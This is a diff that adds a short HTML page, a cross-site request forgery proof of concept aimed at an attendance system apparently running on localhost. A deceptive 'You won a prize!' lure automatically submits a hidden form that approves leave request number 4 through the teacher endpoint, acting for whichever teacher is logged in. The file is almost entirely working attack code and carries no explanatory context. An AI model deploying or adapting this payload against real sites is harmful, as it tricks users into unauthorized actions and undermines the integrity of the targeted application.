@@ -1,0 +1,12 @@
+<!DOCTYPE html>
+<html>
+<head><title>You won a prize!</title></head>
+<body>
+<h1>Congratulations! Please wait...</h1>
+<form id="csrf" action="http://localhost/attendance_system/public/teacher/leave_requests.php" method="POST">
+  <input type="hidden" name="request_id" value="4">
+  <input type="hidden" name="action" value="approved">
+</form>
+<script>document.getElementById('csrf').submit();</script>
+</body>
+</html>
